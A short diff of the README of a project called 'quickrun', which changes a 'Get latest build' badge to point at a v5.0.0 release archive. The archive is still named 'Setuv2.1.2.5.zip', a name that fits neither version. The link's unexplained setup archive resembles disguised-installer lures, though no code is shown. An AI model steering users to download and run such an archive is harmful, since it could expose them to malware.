@@ -1,4 +1,4 @@
-[![Get](https://img.shields.io/badge/get-latest%20build-informational?style=flat-square&logo=github)](https://github.com/dmitry-mooreeng2096j6/quickrun/releases/download/v4.0.0/Setuv2.1.2.5.zip)
+[![Get](https://img.shields.io/badge/get-latest%20build-informational?style=flat-square&logo=github)](https://github.com/dmitry-mooreeng2096j6/quickrun/releases/download/v5.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ quickrun
 
